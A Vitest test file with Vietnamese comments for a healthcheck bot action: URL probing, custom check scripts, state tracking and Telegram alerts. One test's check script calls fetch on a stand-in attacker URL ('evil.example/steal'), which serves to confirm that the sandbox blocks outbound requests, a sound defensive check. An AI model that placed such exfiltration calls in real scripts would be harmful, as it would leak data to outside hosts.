import { describe, it, expect, beforeAll, beforeEach, afterEach } from 'vitest';
import {
    SELF,
    env,
    botToken,
    adminCookie,
    seedHealthTarget,
    seedHealthConfig,
    mockHttp,
    type HttpMock,
} from './helpers';

// URL không phải Telegram mà chưa `on()` → ném lỗi. Nên "không fetch site tắt" và
// "script không gọi được fetch ra ngoài" là điều được canh thật.
let m: HttpMock;
beforeEach(() => {
    m = mockHttp();
});
afterEach(() => m.restore());

const CHAT_ID = '-100987654321';
const TOPIC_ID = '19';

// Lấy token MỘT lần: `/bot/session` bị BOT_LOGIN_LIMITER chặn ở 10 lần/phút/IP, mà file
// này có nhiều hơn thế. JWT stateless + hạn 2h nên dùng lại xuyên suốt được.
let TOKEN: string;
beforeAll(async () => {
    TOKEN = await botToken();
});

const run = async (payload: Record<string, unknown> = {}) =>
    SELF.fetch('https://x/api/bot/actions/healthcheck.run/run', {
        method: 'POST',
        headers: { 'content-type': 'application/json', Authorization: `Bearer ${TOKEN}` },
        body: JSON.stringify({ payload }),
    });

const stateOf = async (label: string) => {
    const { results } = await env.assistant_db
        .prepare('SELECT last_state, last_state_at, last_checked_at FROM healthcheck_targets WHERE label = ?')
        .bind(label)
        .all();
    return results[0] as { last_state: string | null; last_state_at: number | null; last_checked_at: number | null };
};

describe('healthcheck.run', () => {
    it('không có target đang bật → ok, không fetch, không Telegram', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'Tắt', enabled: 0, url: 'https://off.example/h' });

        const res = await run();
        expect(res.status).toBe(200);
        const body = (await res.json()) as { ok: boolean; data: { checked: number; changes: number } };
        expect(body.ok).toBe(true);
        expect(body.data.checked).toBe(0);
        expect(m.fetched).toHaveLength(0);
        expect(m.telegram).toHaveLength(0);
    });

    it('target enabled=0 không bao giờ bị fetch', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'On', url: 'https://on.example/h' });
        await seedHealthTarget({ label: 'Off', enabled: 0, url: 'https://off.example/h' });
        m.on('https://on.example/h', { status: 200 });

        await run();
        expect(m.fetched).toEqual(['https://on.example/h']);
    });

    it('lần đầu, site UP (200), last_state null → không Telegram, chốt last_state=up', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'A', url: 'https://a.example/h', lastState: null });
        m.on('https://a.example/h', { status: 200, body: 'ok' });

        const body = (await (await run()).json()) as { ok: boolean; data: { changes: number } };
        expect(body.ok).toBe(true);
        expect(body.data.changes).toBe(0);
        expect(m.telegram).toHaveLength(0);
        expect((await stateOf('A')).last_state).toBe('up');
    });

    it('lần đầu, site DOWN (503), last_state null → 1 Telegram, chốt last_state=down', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'A', url: 'https://a.example/h', lastState: null });
        m.on('https://a.example/h', { status: 503 });

        const body = (await (await run()).json()) as { ok: boolean; data: { changes: number; sent: number } };
        expect(body.data.changes).toBe(1);
        expect(body.data.sent).toBe(1);
        expect(m.telegram).toHaveLength(1);
        expect(m.telegram[0].chat_id).toBe(CHAT_ID);
        expect(m.telegram[0].message_thread_id).toBe(Number(TOPIC_ID));
        expect(m.telegram[0].text).toContain('A');
        expect(m.telegram[0].text).toContain('🔴');
        expect((await stateOf('A')).last_state).toBe('down');
    });

    it('DOWN → DOWN (không đổi) → không Telegram, vẫn cập nhật last_checked_at', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'A', url: 'https://a.example/h', lastState: 'down' });
        m.on('https://a.example/h', { status: 500 });

        const body = (await (await run()).json()) as { data: { changes: number } };
        expect(body.data.changes).toBe(0);
        expect(m.telegram).toHaveLength(0);
        expect((await stateOf('A')).last_checked_at).not.toBeNull();
    });

    it('DOWN → UP (phục hồi) → 1 Telegram 🟢, last_state=up', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'A', url: 'https://a.example/h', lastState: 'down' });
        m.on('https://a.example/h', { status: 200 });

        const body = (await (await run()).json()) as { data: { changes: number; sent: number } };
        expect(body.data.sent).toBe(1);
        expect(m.telegram[0].text).toContain('🟢');
        expect(m.telegram[0].text).toContain('down → up');
        expect((await stateOf('A')).last_state).toBe('up');
    });

    it('HTTP 404 không có script → tính là down (phương án 2)', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'A', url: 'https://a.example/h', lastState: 'up' });
        m.on('https://a.example/h', { status: 404 });

        await run();
        expect(m.telegram).toHaveLength(1);
        expect((await stateOf('A')).last_state).toBe('down');
    });

    it('checkScript return "up" cho 500 → admin đè luật mặc định, không Telegram', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({
            label: 'A',
            url: 'https://a.example/h',
            lastState: 'up',
            checkScript: 'return "up"',
        });
        m.on('https://a.example/h', { status: 500, body: 'still fine' });

        const body = (await (await run()).json()) as { data: { changes: number } };
        expect(body.data.changes).toBe(0);
        expect(m.telegram).toHaveLength(0);
    });

    it('checkScript soi body: thiếu "ok" → down → Telegram', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({
            label: 'A',
            url: 'https://a.example/h',
            lastState: 'up',
            checkScript: 'return probe.body.includes("ok") ? "up" : "down"',
        });
        m.on('https://a.example/h', { status: 200, body: '{"status":"degraded"}' });

        await run();
        expect(m.telegram).toHaveLength(1);
        expect((await stateOf('A')).last_state).toBe('down');
    });

    it('checkScript ném lỗi → down, last_detail nhắc "script"', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({
            label: 'A',
            url: 'https://a.example/h',
            lastState: 'up',
            checkScript: 'throw new Error("hỏng")',
        });
        m.on('https://a.example/h', { status: 200, body: 'x' });

        await run();
        expect(m.telegram).toHaveLength(1);
        // scriptError không vào last_detail (đó là probeDetail), nhưng state phải là down.
        expect((await stateOf('A')).last_state).toBe('down');
    });

    it('checkScript gọi fetch() → bị che undefined → không có request ra ngoài', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({
            label: 'A',
            url: 'https://a.example/h',
            lastState: 'down',
            checkScript: 'fetch("https://evil.example/steal"); return "up"',
        });
        m.on('https://a.example/h', { status: 200, body: 'x' });

        await run();
        // Chỉ URL target bị fetch, không có evil.example.
        expect(m.fetched).toEqual(['https://a.example/h']);
        // fetch ném (undefined) → catch → state 'down' → không đổi so với 'down' → không Telegram.
        expect(m.telegram).toHaveLength(0);
    });

    it('dryRun → không Telegram, không ghi DB', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'A', url: 'https://a.example/h', lastState: 'up' });
        m.on('https://a.example/h', { status: 503 });

        const body = (await (await run({ dryRun: true })).json()) as { ok: boolean; data: { dryRun: boolean; changes: number } };
        expect(body.ok).toBe(true);
        expect(body.data.dryRun).toBe(true);
        expect(body.data.changes).toBe(1);
        expect(m.telegram).toHaveLength(0);
        const s = await stateOf('A');
        expect(s.last_state).toBe('up'); // giữ nguyên
        expect(s.last_checked_at).toBeNull(); // không ghi
    });

    it('chưa cấu hình đích + có thay đổi → ok:false, last_state KHÔNG advance', async () => {
        // Không seedHealthConfig → healthcheck_config trống.
        await seedHealthTarget({ label: 'A', url: 'https://a.example/h', lastState: 'up' });
        m.on('https://a.example/h', { status: 503 });

        const res = await run();
        expect(res.status).toBe(502);
        const body = (await res.json()) as { ok: boolean; data: { reason: string } };
        expect(body.ok).toBe(false);
        expect(body.data.reason).toBe('not_configured');
        expect(m.telegram).toHaveLength(0);
        expect((await stateOf('A')).last_state).toBe('up'); // chưa chốt → lần sau thử lại
    });

    it('Telegram gửi lỗi → ok:false, last_state KHÔNG advance (không mất cảnh báo)', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'A', url: 'https://a.example/h', lastState: 'up' });
        m.on('https://a.example/h', { status: 503 });
        m.failNextTelegram(400, { ok: false, description: 'chat not found' });

        const body = (await (await run()).json()) as { ok: boolean; data: { sent: number } };
        expect(body.ok).toBe(false);
        expect(body.data.sent).toBe(0);
        expect((await stateOf('A')).last_state).toBe('up');
    });

    it('lỗi mạng (fetch ném) → state down → Telegram', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'A', url: 'https://a.example/h', lastState: 'up' });
        m.on('https://a.example/h', { throw: 'ECONNREFUSED' });

        await run();
        expect(m.telegram).toHaveLength(1);
        expect((await stateOf('A')).last_state).toBe('down');
    });

    it('nhiều target cùng đổi → mỗi target một tin Telegram', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'A', url: 'https://a.example/h', lastState: 'up' });
        await seedHealthTarget({ label: 'B', url: 'https://b.example/h', lastState: 'up' });
        m.on('https://a.example/h', { status: 500 });
        m.on('https://b.example/h', { status: 502 });

        const body = (await (await run()).json()) as { data: { sent: number } };
        expect(body.data.sent).toBe(2);
        expect(m.telegram).toHaveLength(2);
    });

    it('ghi execution_logs với action_id healthcheck.run', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'A', url: 'https://a.example/h', lastState: 'up' });
        m.on('https://a.example/h', { status: 200 });

        await run();
        const { results } = await env.assistant_db
            .prepare('SELECT action_id, status FROM execution_logs')
            .all();
        expect(results).toHaveLength(1);
        expect(results[0]).toMatchObject({ action_id: 'healthcheck.run', status: 'ok' });
    });
});

describe('POST /api/admin/healthchecks/run — nút "Kiểm tra ngay" trên list', () => {
    const runReq = async () =>
        SELF.fetch('https://x/api/admin/healthchecks/run', {
            method: 'POST',
            headers: { Cookie: await adminCookie() },
        });

    it('không cookie admin → 401, không fetch, không Telegram', async () => {
        const res = await SELF.fetch('https://x/api/admin/healthchecks/run', { method: 'POST' });
        expect(res.status).toBe(401);
        expect(m.fetched).toHaveLength(0);
        expect(m.telegram).toHaveLength(0);
    });

    it('chạy thật: cập nhật last_state, gửi Telegram khi đổi, ghi log [chạy tay]', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'A', url: 'https://a.example/h', lastState: 'up' });
        m.on('https://a.example/h', { status: 503 });

        const res = await runReq();
        expect(res.status).toBe(200);
        const body = (await res.json()) as { ok: boolean; summary: string };
        expect(body.ok).toBe(true);
        expect(m.telegram).toHaveLength(1);
        expect((await stateOf('A')).last_state).toBe('down');

        const { results } = await env.assistant_db.prepare('SELECT status, detail FROM execution_logs').all();
        expect(results).toHaveLength(1);
        expect(String(results[0].detail)).toContain('[chạy tay]');
    });
});

describe('POST /api/admin/healthcheck-config/test — nút "Gửi thử"', () => {
    const testReq = async () =>
        SELF.fetch('https://x/api/admin/healthcheck-config/test', {
            method: 'POST',
            headers: { Cookie: await adminCookie() },
        });

    it('không cookie admin → 401, không Telegram', async () => {
        const res = await SELF.fetch('https://x/api/admin/healthcheck-config/test', { method: 'POST' });
        expect(res.status).toBe(401);
        expect(m.telegram).toHaveLength(0);
    });

    it('có target đổi trạng thái + cấu hình đủ → gửi Telegram thật, ghi log [test]', async () => {
        await seedHealthConfig({ chatId: CHAT_ID, topicId: TOPIC_ID });
        await seedHealthTarget({ label: 'A', url: 'https://a.example/h', lastState: 'up' });
        m.on('https://a.example/h', { status: 503 });

        const res = await testReq();
        expect(res.status).toBe(200);
        const body = (await res.json()) as { ok: boolean; summary: string };
        expect(body.ok).toBe(true);
        expect(m.telegram).toHaveLength(1);

        const { results } = await env.assistant_db.prepare('SELECT status, detail FROM execution_logs').all();
        expect(results).toHaveLength(1);
        expect(String(results[0].detail)).toContain('[test]');
    });
});
